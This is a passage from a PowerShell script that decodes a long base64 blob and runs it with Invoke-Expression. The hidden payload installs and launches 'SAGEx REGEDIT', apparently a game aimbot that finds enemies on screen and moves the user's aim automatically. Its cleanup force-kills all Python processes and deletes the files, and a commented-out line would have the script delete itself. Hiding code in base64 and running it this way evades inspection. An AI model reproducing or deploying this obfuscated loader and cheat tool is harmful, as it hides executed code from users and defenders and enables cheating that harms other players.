nLURBU0hDT09MRE9XTi0nXS51cGRhdGUoY29vbGRvd25fcGVyY2VudCkNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uZmlnLmNvbmZpZGVuY2UgPSBmbG9hdCh2YWx1ZXNbJy1DT05GSURFTkNFLSddKQ0KICAgICAgICAgICAgY29uZmlnLnNtb290aG5lc3MgPSBmbG9hdCh2YWx1ZXNbJy1TTU9PVEhORVNTLSddKQ0KICAgICAgICAgICAgaWYgY29uZmlnLnJlZ2lvbl9zaXplICE9IGludCh2YWx1ZXNbJy1SRUdJT04tJ10pOg0KICAgICAgICAgICAgICAgIGNvbmZpZy5yZWdpb25fc2l6ZSA9IGludCh2YWx1ZXNbJy1SRUdJT04tJ10pDQogICAgICAgICAgICAgICAgY29uZmlnLnVwZGF0ZV9zY3JlZW5fcGFyYW1zKCkNCiAgICAgICAgICAgIGNvbmZpZy5lbmFibGVfc291bmQgPSBib29sKHZhbHVlc1snLVNPVU5ELSddKQ0KICAgICAgICAgICAgY29uZmlnLmRhc2hfa2V5ID0gc3RyKHZhbHVlc1snLURBU0hLRVktJ10pDQogICAgICAgICAgICBjb25maWcuZGFzaF9kdXJhdGlvbiA9IGZsb2F0KHZhbHVlc1snLURBU0hEVVJBVElPTi0nXSkNCiAgICAgICAgICAgIGNvbmZpZy5kYXNoX2Nvb2xkb3duID0gZmxvYXQodmFsdWVzWyctREFTSENPT0xET1dOX1NMSURFUi0nXSkNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgY29uZmlnLmFjdGl2ZSBhbmQgbG1iX2hlbGQoKToNCiAgICAgICAgICAgICAgICB0YXJnZXQgPSBkZXRlY3RfZW5lbXkoY29uZmlnLCBtb2RlbCkNCiAgICAgICAgICAgICAgICBpZiB0YXJnZXQ6DQogICAgICAgICAgICAgICAgICAgIHNtb290aF9haW1fdG8oY29uZmlnLCAqdGFyZ2V0KQ0KICAgICAgICAgICAgDQogICAgICAgICAgICB0aW1lLnNsZWVwKG1heChjb25maWcuc2Nhbl9pbnRlcnZhbCwgMC4wMSkpDQogICAgICAgIA0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcHJpbnQoZiJbQ1JJVElDQUxdIE1haW4gbG9vcCBlcnJvcjoge3N0cihlKX0iKQ0KICAgIGZpbmFsbHk6DQogICAgICAgIHdpbmRvdy5jbG9zZSgpDQogICAgICAgIHByaW50KCJbK10gU0FHRXggUkVHRURJVCBzaHV0ZG93biBjb21wbGV0ZSIpDQoNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgbWFpbigpDQonQCB8IE91dC1GaWxlIC1GaWxlUGF0aCAkdGVtcFB5IC1FbmNvZGluZyB1dGY4IC1Gb3JjZQ0KfQ0KDQojIE1haW4gZXhlY3V0aW9uDQp0cnkgew0KICAgICMgU2hvdyBjb25zb2xlIHdpbmRvdyBpZiBoaWRkZW4NCiAgICBTaG93LUNvbnNvbGUNCiAgICANCiAgICAjIENoZWNrIGFkbWluIChub3QgcmVxdWlyZWQgYnV0IHJlY29tbWVuZGVkKQ0KICAgIGlmICgtbm90IChUZXN0LUFkbWluKSkgew0KICAgICAgICBXcml0ZS1Ib3N0ICJbIV0gV2FybmluZzogUnVubmluZyB3aXRob3V0IGFkbWluIHByaXZpbGVnZXMiIC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93DQogICAgfQ0KICAgIA0KICAgICMgQ2hlY2sgUHl0aG9uDQogICAgV3JpdGUtSG9zdCAiWytdIENoZWNraW5nIFB5dGhvbi4uLiIgLUZvcmVncm91bmRDb2xvciBDeWFuDQogICAgdHJ5IHsNCiAgICAgICAgJHB5dGhvblZlcnNpb24gPSAoJiBweXRob24gLS12ZXJzaW9uIDI+JjEgfCBPdXQtU3RyaW5nKS5UcmltKCkNCiAgICAgICAgaWYgKC1ub3QgJHB5dGhvblZlcnNpb24gLW9yICRweXRob25WZXJzaW9uIC1tYXRjaCAibm90IGZvdW5kIikgew0KICAgICAgICAgICAgdGhyb3cgIlB5dGhvbiBub3QgZm91bmQiDQogICAgICAgIH0NCiAgICAgICAgV3JpdGUtSG9zdCAiICAtIEZvdW5kICRweXRob25WZXJzaW9uIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuDQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgICAgV3JpdGUtSG9zdCAiWy1dIFB5dGhvbiBpcyByZXF1aXJlZC4gSW5zdGFsbCBmcm9tIGh0dHBzOi8vd3d3LnB5dGhvbi5vcmcvIiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KICAgICAgICBwYXVzZQ0KICAgICAgICBleGl0IDENCiAgICB9DQogICAgDQogICAgIyBJbnN0YWxsIHBhY2thZ2VzDQogICAgSW5zdGFsbC1QYWNrYWdlcw0KICAgIA0KICAgICMgVmVyaWZ5IG9yIGRvd25sb2FkIG1vZGVsDQogICAgaWYgKC1ub3QgKFRlc3QtTW9kZWwpKSB7DQogICAgICAgIFdyaXRlLUhvc3QgIlshXSBNb2RlbCBub3QgZm91bmQgb3IgaW52YWxpZC4gRG93bmxvYWRpbmcuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93DQogICAgICAgIGlmICgtbm90IChHZXQtTW9kZWwpKSB7DQogICAgICAgICAgICBXcml0ZS1Ib3N0ICJbLV0gRmFpbGVkIHRvIGluaXRpYWxpemUgbW9kZWwuIEV4aXRpbmcuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQogICAgICAgICAgICBwYXVzZQ0KICAgICAgICAgICAgZXhpdCAxDQogICAgICAgIH0NCiAgICB9DQogICAgV3JpdGUtSG9zdCAiWytdIE1vZGVsIHZlcmlmaWVkIHN1Y2Nlc3NmdWxseSEiIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4NCiAgICANCiAgICAjIENyZWF0ZSBQeXRob24gc2NyaXB0DQogICAgQ3JlYXRlLVB5dGhvblNjcmlwdA0KICAgIA0KICAgICMgTGF1bmNoIHRoZSBhaW1ib3QNCiAgICBXcml0ZS1Ib3N0ICJbK10gTGF1bmNoaW5nIFNBR0V4IFJFR0VESVQgVjIuMS4uLiIgLUZvcmVncm91bmRDb2xvciBHcmVlbg0KICAgICYgcHl0aG9uICR0ZW1wUHkNCiAgICANCiAgICBXcml0ZS1Ib3N0ICJbK10gU2NyaXB0IGNvbXBsZXRlZCBzdWNjZXNzZnVsbHkiIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4NCn0NCmNhdGNoIHsNCiAgICBXcml0ZS1Ib3N0ICJbLV0gRVJST1I6ICRfIiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KICAgIFdyaXRlLUhvc3QgIlstXSBTdGFjayBUcmFjZTogJCgkXy5TY3JpcHRTdGFja1RyYWNlKSIgLUZvcmVncm91bmRDb2xvciBEYXJrUmVkDQogICAgcGF1c2UNCn0NCmZpbmFsbHkgew0KICAgICMgQ2xlYW51cCBpZiBuZWVkZWQNCiAgICBXcml0ZS1Ib3N0ICJbK10gQ2xlYW5pbmcgdXAuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgQ3lhbg0KCWZ1bmN0aW9uIEZvcmNlLVJlbW92ZVNBR0V4RmlsZXMgew0KICAgICRhcHBEYXRhRm9sZGVyID0gIiRlbnY6QVBQREFUQVxTQUdFeCBSRUdFRElUIg0KICAgICRweXRob25TY3JpcHQgPSAiJGFwcERhdGFGb2xkZXJcU0FHRXggUkVHRURJVC5weSINCg0KICAgIGlmIChUZXN0LVBhdGggJHB5dGhvblNjcmlwdCkgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgIyBLaWxsIFB5dGhvbiBpZiBydW5uaW5nDQogICAgICAgICAgICBHZXQtUHJvY2VzcyBweXRob24gLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBTdG9wLVByb2Nlc3MgLUZvcmNlDQogICAgICAgICAgICBSZW1vdmUtSXRlbSAtUGF0aCAkcHl0aG9uU2NyaXB0IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU3RvcA0KICAgICAgICAgICAgV3JpdGUtSG9zdCAiWytdIFN1Y2Nlc3NmdWxseSBkZWxldGVkIFNBR0V4IFJFR0VESVQucHkiIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4NCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCB7DQogICAgICAgICAgICBXcml0ZS1Ib3N0ICJbIV0gRmFpbGVkIHRvIGRlbGV0ZSBTQUdFeCBSRUdFRElULnB5OiAkXyIgLUZvcmVncm91bmRDb2xvciBSZWQNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KRm9yY2UtUmVtb3ZlU0FHRXhGaWxlcw0KV3JpdGUtSG9zdCAiWytdIENsZWFuZWQgdXAuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgQ3lhbg0KDQp9';
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload));
Invoke-Expression $decoded;

# Optional auto-delete:
# Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
